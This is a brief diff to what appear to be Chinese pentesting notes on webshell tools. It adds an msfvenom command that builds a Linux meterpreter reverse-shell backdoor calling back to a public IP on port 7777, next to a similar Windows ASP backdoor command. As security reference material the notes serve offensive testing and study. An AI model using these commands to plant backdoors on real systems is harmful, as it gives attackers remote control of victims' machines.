@@ -34,6 +34,7 @@ WebShell管理工具
 	+ 非通用后门。
 - Metasploit生成后门
 	+ ``msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.131 -f asp > shell.asp`` 
+	+ ``msfvenom  -p linux/x64/meterpreter/reverse_tcp LHOST=118.195.199.66 LPORT=7777 -f elf > shell_x64.elf``
 	+ 连接后门
 		::
 		
